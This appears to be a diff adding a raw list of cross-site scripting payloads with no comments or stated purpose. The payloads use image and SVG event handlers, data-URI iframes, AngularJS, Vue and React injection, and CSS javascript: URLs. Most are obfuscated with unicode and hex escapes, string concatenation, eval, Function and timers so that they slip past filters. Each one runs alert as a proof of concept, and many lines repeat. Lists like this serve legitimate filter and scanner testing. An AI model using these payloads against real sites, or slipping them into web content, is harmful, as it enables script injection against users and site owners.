@@ -1,0 +1,274 @@
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074`1`>
+<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>
+<svg onload=\u0061\u006c\u0065\u0072\u0074`1`>
+<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>
+<svg/onload=\u0061\u006c\u0065\u0072\u0074`1`>
+<svg onload=\x61\x6c\x65\x72\x74(1)>
+<svg onload=\x61\x6c\x65\x72\x74`1`>
+<svg/onload=\x61\x6c\x65\x72\x74(1)>
+<svg/onload=\x61\x6c\x65\x72\x74`1`>
+<img src=x onerror=a=alert,a(1)>
+<img src=x onerror=a=alert;a(1)>
+<img src=x onerror="a=alert;a(1)">
+<img src=x onerror="a=alert;a`1`">
+<img src=x onerror="a=\u0061\u006c\u0065\u0072\u0074;a(1)">
+<img src=x onerror="a=\u0061\u006c\u0065\u0072\u0074;a`1`">
+<img src=x onerror="a=\x61\x6c\x65\x72\x74;a(1)">
+<img src=x onerror="a=\x61\x6c\x65\x72\x74;a`1`">
+<svg onload="a=alert;a(1)">
+<svg onload="a=alert;a`1`">
+<svg onload="a=\u0061\u006c\u0065\u0072\u0074;a(1)">
+<svg onload="a=\u0061\u006c\u0065\u0072\u0074;a`1`">
+<svg onload="a=\x61\x6c\x65\x72\x74;a(1)">
+<svg onload="a=\x61\x6c\x65\x72\x74;a`1`">
+<svg/onload="a=alert;a(1)">
+<svg/onload="a=alert;a`1`">
+<svg/onload="a=\u0061\u006c\u0065\u0072\u0074;a(1)">
+<svg/onload="a=\u0061\u006c\u0065\u0072\u0074;a`1`">
+<svg/onload="a=\x61\x6c\x65\x72\x74;a(1)">
+<svg/onload="a=\x61\x6c\x65\x72\x74;a`1`">
+<img src=x onerror=self['ale'+'rt'](1)>
+<img src=x onerror=self[`ale`+`rt`](1)>
+<img src=x onerror=self['\u0061\u006c\u0065\u0072\u0074'](1)>
+<img src=x onerror=self[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<img src=x onerror=self['\x61\x6c\x65\x72\x74'](1)>
+<img src=x onerror=self[`\x61\x6c\x65\x72\x74`](1)>
+<svg onload=self['ale'+'rt'](1)>
+<svg onload=self[`ale`+`rt`](1)>
+<svg onload=self['\u0061\u006c\u0065\u0072\u0074'](1)>
+<svg onload=self[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<svg onload=self['\x61\x6c\x65\x72\x74'](1)>
+<svg onload=self[`\x61\x6c\x65\x72\x74`](1)>
+<svg/onload=self['ale'+'rt'](1)>
+<svg/onload=self[`ale`+`rt`](1)>
+<svg/onload=self['\u0061\u006c\u0065\u0072\u0074'](1)>
+<svg/onload=self[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<svg/onload=self['\x61\x6c\x65\x72\x74'](1)>
+<svg/onload=self[`\x61\x6c\x65\x72\x74`](1)>
+<img src=x onerror=top['ale'+'rt'](1)>
+<img src=x onerror=top[`ale`+`rt`](1)>
+<img src=x onerror=top['\u0061\u006c\u0065\u0072\u0074'](1)>
+<img src=x onerror=top[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<img src=x onerror=top['\x61\x6c\x65\x72\x74'](1)>
+<img src=x onerror=top[`\x61\x6c\x65\x72\x74`](1)>
+<svg onload=top['ale'+'rt'](1)>
+<svg onload=top[`ale`+`rt`](1)>
+<svg onload=top['\u0061\u006c\u0065\u0072\u0074'](1)>
+<svg onload=top[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<svg onload=top['\x61\x6c\x65\x72\x74'](1)>
+<svg onload=top[`\x61\x6c\x65\x72\x74`](1)>
+<svg/onload=top['ale'+'rt'](1)>
+<svg/onload=top[`ale`+`rt`](1)>
+<svg/onload=top['\u0061\u006c\u0065\u0072\u0074'](1)>
+<svg/onload=top[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<svg/onload=top['\x61\x6c\x65\x72\x74'](1)>
+<svg/onload=top[`\x61\x6c\x65\x72\x74`](1)>
+<img src=x onerror=parent['ale'+'rt'](1)>
+<img src=x onerror=parent[`ale`+`rt`](1)>
+<img src=x onerror=parent['\u0061\u006c\u0065\u0072\u0074'](1)>
+<img src=x onerror=parent[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<img src=x onerror=parent['\x61\x6c\x65\x72\x74'](1)>
+<img src=x onerror=parent[`\x61\x6c\x65\x72\x74`](1)>
+<svg onload=parent['ale'+'rt'](1)>
+<svg onload=parent[`ale`+`rt`](1)>
+<svg onload=parent['\u0061\u006c\u0065\u0072\u0074'](1)>
+<svg onload=parent[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<svg onload=parent['\x61\x6c\x65\x72\x74'](1)>
+<svg onload=parent[`\x61\x6c\x65\x72\x74`](1)>
+<svg/onload=parent['ale'+'rt'](1)>
+<svg/onload=parent[`ale`+`rt`](1)>
+<svg/onload=parent['\u0061\u006c\u0065\u0072\u0074'](1)>
+<svg/onload=parent[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<svg/onload=parent['\x61\x6c\x65\x72\x74'](1)>
+<svg/onload=parent[`\x61\x6c\x65\x72\x74`](1)>
+<img src=x onerror=window['ale'+'rt'](1)>
+<img src=x onerror=window[`ale`+`rt`](1)>
+<img src=x onerror=window['\u0061\u006c\u0065\u0072\u0074'](1)>
+<img src=x onerror=window[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<img src=x onerror=window['\x61\x6c\x65\x72\x74'](1)>
+<img src=x onerror=window[`\x61\x6c\x65\x72\x74`](1)>
+<svg onload=window['ale'+'rt'](1)>
+<svg onload=window[`ale`+`rt`](1)>
+<svg onload=window['\u0061\u006c\u0065\u0072\u0074'](1)>
+<svg onload=window[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<svg onload=window['\x61\x6c\x65\x72\x74'](1)>
+<svg onload=window[`\x61\x6c\x65\x72\x74`](1)>
+<svg/onload=window['ale'+'rt'](1)>
+<svg/onload=window[`ale`+`rt`](1)>
+<svg/onload=window['\u0061\u006c\u0065\u0072\u0074'](1)>
+<svg/onload=window[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<svg/onload=window['\x61\x6c\x65\x72\x74'](1)>
+<svg/onload=window[`\x61\x6c\x65\x72\x74`](1)>
+<img src=x onerror=this['ale'+'rt'](1)>
+<img src=x onerror=this[`ale`+`rt`](1)>
+<img src=x onerror=this['\u0061\u006c\u0065\u0072\u0074'](1)>
+<img src=x onerror=this[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<img src=x onerror=this['\x61\x6c\x65\x72\x74'](1)>
+<img src=x onerror=this[`\x61\x6c\x65\x72\x74`](1)>
+<svg onload=this['ale'+'rt'](1)>
+<svg onload=this[`ale`+`rt`](1)>
+<svg onload=this['\u0061\u006c\u0065\u0072\u0074'](1)>
+<svg onload=this[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<svg onload=this['\x61\x6c\x65\x72\x74'](1)>
+<svg onload=this[`\x61\x6c\x65\x72\x74`](1)>
+<svg/onload=this['ale'+'rt'](1)>
+<svg/onload=this[`ale`+`rt`](1)>
+<svg/onload=this['\u0061\u006c\u0065\u0072\u0074'](1)>
+<svg/onload=this[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<svg/onload=this['\x61\x6c\x65\x72\x74'](1)>
+<svg/onload=this[`\x61\x6c\x65\x72\x74`](1)>
+<img src=x onerror=globalThis['ale'+'rt'](1)>
+<img src=x onerror=globalThis[`ale`+`rt`](1)>
+<img src=x onerror=globalThis['\u0061\u006c\u0065\u0072\u0074'](1)>
+<img src=x onerror=globalThis[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<img src=x onerror=globalThis['\x61\x6c\x65\x72\x74'](1)>
+<img src=x onerror=globalThis[`\x61\x6c\x65\x72\x74`](1)>
+<svg onload=globalThis['ale'+'rt'](1)>
+<svg onload=globalThis[`ale`+`rt`](1)>
+<svg onload=globalThis['\u0061\u006c\u0065\u0072\u0074'](1)>
+<svg onload=globalThis[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<svg onload=globalThis['\x61\x6c\x65\x72\x74'](1)>
+<svg onload=globalThis[`\x61\x6c\x65\x72\x74`](1)>
+<svg/onload=globalThis['ale'+'rt'](1)>
+<svg/onload=globalThis[`ale`+`rt`](1)>
+<svg/onload=globalThis['\u0061\u006c\u0065\u0072\u0074'](1)>
+<svg/onload=globalThis[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<svg/onload=globalThis['\x61\x6c\x65\x72\x74'](1)>
+<svg/onload=globalThis[`\x61\x6c\x65\x72\x74`](1)>
+<img src=x onerror=eval('\u0061\u006c\u0065\u0072\u0074(1)')>
+<img src=x onerror=eval('\u0061\u006c\u0065\u0072\u0074`1`')>
+<img src=x onerror=eval('\x61\x6c\x65\x72\x74(1)')>
+<img src=x onerror=eval('\x61\x6c\x65\x72\x74`1`')>
+<svg onload=eval('\u0061\u006c\u0065\u0072\u0074(1)')>
+<svg onload=eval('\u0061\u006c\u0065\u0072\u0074`1`')>
+<svg onload=eval('\x61\x6c\x65\x72\x74(1)')>
+<svg onload=eval('\x61\x6c\x65\x72\x74`1`')>
+<svg/onload=eval('\u0061\u006c\u0065\u0072\u0074(1)')>
+<svg/onload=eval('\u0061\u006c\u0065\u0072\u0074`1`')>
+<svg/onload=eval('\x61\x6c\x65\x72\x74(1)')>
+<svg/onload=eval('\x61\x6c\x65\x72\x74`1`')>
+<img src=x onerror=Function('ale'+'rt(1)')()>
+<img src=x onerror=Function(`ale`+`rt(1)`)()>
+<img src=x onerror=Function('\u0061\u006c\u0065\u0072\u0074(1)')()>
+<img src=x onerror=Function(`\u0061\u006c\u0065\u0072\u0074(1)`)()>
+<img src=x onerror=Function('\x61\x6c\x65\x72\x74(1)')()>
+<img src=x onerror=Function(`\x61\x6c\x65\x72\x74(1)`)()>
+<svg onload=Function('ale'+'rt(1)')()>
+<svg onload=Function(`ale`+`rt(1)`)()>
+<svg onload=Function('\u0061\u006c\u0065\u0072\u0074(1)')()>
+<svg onload=Function(`\u0061\u006c\u0065\u0072\u0074(1)`)()>
+<svg onload=Function('\x61\x6c\x65\x72\x74(1)')()>
+<svg onload=Function(`\x61\x6c\x65\x72\x74(1)`)()>
+<svg/onload=Function('ale'+'rt(1)')()>
+<svg/onload=Function(`ale`+`rt(1)`)()>
+<svg/onload=Function('\u0061\u006c\u0065\u0072\u0074(1)')()>
+<svg/onload=Function(`\u0061\u006c\u0065\u0072\u0074(1)`)()>
+<svg/onload=Function('\x61\x6c\x65\x72\x74(1)')()>
+<svg/onload=Function(`\x61\x6c\x65\x72\x74(1)`)()>
+<img src=x onerror=setTimeout('ale'+'rt(1)')>
+<img src=x onerror=setTimeout(`ale`+`rt(1)`)>
+<img src=x onerror=setTimeout('\u0061\u006c\u0065\u0072\u0074(1)')>
+<img src=x onerror=setTimeout(`\u0061\u006c\u0065\u0072\u0074(1)`)>
+<img src=x onerror=setTimeout('\x61\x6c\x65\x72\x74(1)')>
+<img src=x onerror=setTimeout(`\x61\x6c\x65\x72\x74(1)`)>
+<svg onload=setTimeout('ale'+'rt(1)')>
+<svg onload=setTimeout(`ale`+`rt(1)`)>
+<svg onload=setTimeout('\u0061\u006c\u0065\u0072\u0074(1)')>
+<svg onload=setTimeout(`\u0061\u006c\u0065\u0072\u0074(1)`)>
+<svg onload=setTimeout('\x61\x6c\x65\x72\x74(1)')>
+<svg onload=setTimeout(`\x61\x6c\x65\x72\x74(1)`)>
+<svg/onload=setTimeout('ale'+'rt(1)')>
+<svg/onload=setTimeout(`ale`+`rt(1)`)>
+<svg/onload=setTimeout('\u0061\u006c\u0065\u0072\u0074(1)')>
+<svg/onload=setTimeout(`\u0061\u006c\u0065\u0072\u0074(1)`)>
+<svg/onload=setTimeout('\x61\x6c\x65\x72\x74(1)')>
+<svg/onload=setTimeout(`\x61\x6c\x65\x72\x74(1)`)>
+<img src=x onerror=setInterval('ale'+'rt(1)')>
+<img src=x onerror=setInterval(`ale`+`rt(1)`)>
+<img src=x onerror=setInterval('\u0061\u006c\u0065\u0072\u0074(1)')>
+<img src=x onerror=setInterval(`\u0061\u006c\u0065\u0072\u0074(1)`)>
+<img src=x onerror=setInterval('\x61\x6c\x65\x72\x74(1)')>
+<img src=x onerror=setInterval(`\x61\x6c\x65\x72\x74(1)`)>
+<svg onload=setInterval('ale'+'rt(1)')>
+<svg onload=setInterval(`ale`+`rt(1)`)>
+<svg onload=setInterval('\u0061\u006c\u0065\u0072\u0074(1)')>
+<svg onload=setInterval(`\u0061\u006c\u0065\u0072\u0074(1)`)>
+<svg onload=setInterval('\x61\x6c\x65\x72\x74(1)')>
+<svg onload=setInterval(`\x61\x6c\x65\x72\x74(1)`)>
+<svg/onload=setInterval('ale'+'rt(1)')>
+<svg/onload=setInterval(`ale`+`rt(1)`)>
+<svg/onload=setInterval('\u0061\u006c\u0065\u0072\u0074(1)')>
+<svg/onload=setInterval(`\u0061\u006c\u0065\u0072\u0074(1)`)>
+<svg/onload=setInterval('\x61\x6c\x65\x72\x74(1)')>
+<svg/onload=setInterval(`\x61\x6c\x65\x72\x74(1)`)>  
+<img src=x onerror=setTimeout('ale'+'rt(1)')>
+<img src=x onerror=setTimeout(`ale`+`rt(1)`)>
+<img src=x onerror=setInterval('ale'+'rt(1)')>
+<img src=x onerror=setInterval(`ale`+`rt(1)`)>
+<svg><script>alert('XSS')</script></svg>
+<svg><animate onbegin=alert('XSS') attributeName=x dur=1s></svg>
+<svg><set attributeName=x dur=1s onbegin=alert('XSS')></svg>
+<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
+<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+<div v-bind:innerHTML="'<img src=x onerror=alert(1)>'"></div>
+<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}}></div>
+<img src=x onerror=eval('ale'+'rt(1)')>
+<img src=x onerror=eval('\u0061\u006c\u0065\u0072\u0074(1)')>
+<img src=x onerror=eval('\x61\x6c\x65\x72\x74(1)')>
+<svg onload=eval('ale'+'rt(1)')>
+<svg onload=eval('\u0061\u006c\x65\x72\x74(1)')>
+<svg onload=eval('\x61\x6c\x65\x72\x74(1)')>
+<div onclick="alert('XSS')">Click me</div>
+<div onmouseover="alert('XSS')">Hover over me</div>
+<div onfocus="alert('XSS')" tabindex="1">Focus on me</div
+<img src=x onerror=setTimeout('ale'+'rt(1)')>
+<img src=x onerror=setTimeout(`ale`+`rt(1)`)>
+<img src=x onerror=setInterval('ale'+'rt(1)')>
+<img src=x onerror=setInterval(`ale`+`rt(1)`)>
+<img src=x onerror=Function('ale'+'rt(1)')()>
+<img src=x onerror=Function(`ale`+`rt(1)`)()>
+<img src=x onerror=Function('\u0061\u006c\u0065\u0072\u0074(1)')()>
+<img src=x onerror=Function(`\u0061\u006c\u0065\u0072\u0074(1)`)()>
+<img src=x onerror=window['ale'+'rt'](1)>
+<img src=x onerror=window[`ale`+`rt`](1)>
+<img src=x onerror=globalThis['ale'+'rt'](1)>
+<img src=x onerror=globalThis[`ale`+`rt`](1)>
+<img src=x onerror=parent['ale'+'rt'](1)>
+<img src=x onerror=parent[`ale`+`rt`](1)>
+<img src=x onerror=top['ale'+'rt'](1)>
+<img src=x onerror=top[`ale`+`rt`](1)>
+<img src=x onerror=self['ale'+'rt'](1)>
+<img src=x onerror=self[`ale`+`rt`](1)>
+<img src=x onerror=self['\u0061\u006c\u0065\u0072\u0074'](1)>
+<img src=x onerror=self[`\u0061\u006c\u0065\u0072\u0074`](1)>
+<img src=x onerror=a=alert,a(1)>
+<img src=x onerror=a=alert;a(1)>
+<img src=x onerror="a=alert;a(1)">
+<img src=x onerror="a=alert;a`1`">
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074`1`>
+<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>
+<svg onload=\u0061\u006c\u0065\u0072\u0074`1`>
+<img src=x onerror=\x61\x6c\x65\x72\x74(1)>
+<img src=x onerror=\x61\x6c\x65\x72\x74`1`>
+<svg onload=\x61\x6c\x65\x72\x74(1)>
+<svg onload=\x61\x6c\x65\x72\x74`1`>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>
+<img src=x onerror=\x61\x6c\x65\x72\x74(1)>
+<svg onload=\x61\x6c\x65\x72\x74(1)>
+<img src=x onerror=self['alert'](1)>
+<img src=x onerror=window['alert'](1)>
+<img src=x onerror=parent['alert'](1)>
+<img src=x onerror=top['alert'](1)>
+<img src=x onerror=Function('alert(1)')()>
+<img src=x onerror=new Function('alert(1)')()>
+<style>@import 'javascript:alert(1)';</style>
+<style>*{background:url('javascript:alert(1)')}</style>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
+<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
